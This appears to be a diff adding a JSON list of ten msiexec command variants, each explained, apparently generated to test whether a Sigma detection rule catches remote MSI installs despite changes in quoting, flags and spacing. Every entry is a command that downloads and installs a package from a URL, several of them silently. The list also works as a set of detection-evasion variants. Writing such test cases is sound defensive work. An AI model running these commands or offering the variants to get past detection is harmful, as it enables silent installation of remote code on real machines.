@@ -1,0 +1,44 @@
+```json
+[
+  {
+    "output": "msiexec.exe /i \"http://example.com/test.msi\"",
+    "explanation": "Inserted quotes around the URL to test if the Sigma rule detects quoted URLs correctly."
+  },
+  {
+    "output": "msiexec.exe -i http://example.com/test.msi",
+    "explanation": "Substituted the long option '/i' with the equivalent short option '-i' to test if the Sigma rule is syntax-agnostic."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /quiet",
+    "explanation": "Added an optional '/quiet' flag to test if the Sigma rule is affected by additional command-line arguments."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi   ",
+    "explanation": "Inserted extra spaces after the command to test if the Sigma rule is sensitive to spacing variations."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi //url",
+    "explanation": "Added an irrelevant parameter '//url' to test if the Sigma rule is affected by additional parameters."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /log C:\\install.log",
+    "explanation": "Added a '/log' argument to test if the Sigma rule is affected by logging options."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /qn",
+    "explanation": "Used an alternative quiet mode flag '/qn' to test if the Sigma rule is affected by different execution modes."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /norestart",
+    "explanation": "Added a '/norestart' flag to test if the Sigma rule is affected by additional execution parameters."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /promptrestart",
+    "explanation": "Added a '/promptrestart' flag to test if the Sigma rule is affected by additional execution parameters."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/test.msi /passive",
+    "explanation": "Added a '/passive' flag to test if the Sigma rule is affected by different user interface modes."
+  }
+]
+```
